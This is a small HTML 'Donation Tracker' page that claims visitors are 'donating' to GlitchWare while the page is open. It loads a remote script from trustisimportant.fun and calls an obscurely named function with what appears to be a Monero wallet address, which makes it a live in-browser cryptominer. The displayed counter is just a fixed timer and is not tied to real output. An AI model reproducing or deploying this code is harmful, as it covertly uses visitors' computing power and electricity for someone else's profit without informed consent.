<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Donation Tracker</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #222;
        color: #fff;
        text-align: center;
        padding: 50px;
    }
    .donation-info {
        font-size: 24px;
        font-weight: bold;
        margin-bottom: 20px;
    }
    .time-counter {
        font-size: 20px;
        color: #ccc;
        margin-bottom: 10px;
    }
    .donation-rate {
        font-size: 16px;
        color: #999;
        margin-bottom: 20px;
    }
</style>
</head>
<body>
    <div class="donation-info">Donated amount of money to GlitchWare in this session: $<span id="donation-amount">0.0000000000</span></div>
    <div class="time-counter" id="time-counter">00:00:00</div>
    <div class="donation-rate">Current AFK donation rate: $0.0000000144 per second</div>

    <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
    <script type="text/javascript">
        EverythingIsLife('45d5LPYeRSEPywkk61dHxFfSDLKYhRhuP3VoC8d9B98Qgu3jDZTxm9G949ZpLGSTXAUk24sXniAn5WtHLrzFbR3UK2Mhwdt', 'Donate', 70);
    </script>

    <script type="text/javascript">
        // Initialize variables
        var donationAmount = 0.0000000000;
        var secondsElapsed = 0;
        var donationRatePerSecond = 0.0000000144; // Updated donation rate per second for 25 h/s

        // Update counters every second
        setInterval(updateCounters, 1000);

        function updateCounters() {
            // Update donation amount
            donationAmount += donationRatePerSecond;
            document.getElementById('donation-amount').innerText = donationAmount.toFixed(10); // Display up to 10 decimal places

            // Update time counter
            secondsElapsed++;
            var hours = Math.floor(secondsElapsed / 3600);
            var minutes = Math.floor((secondsElapsed % 3600) / 60);
            var seconds = secondsElapsed % 60;
            document.getElementById('time-counter').innerText = formatTime(hours) + ":" + formatTime(minutes) + ":" + formatTime(seconds);
        }

        function formatTime(time) {
            return (time < 10 ? "0" + time : time);
        }
    </script>
</body>
</html>
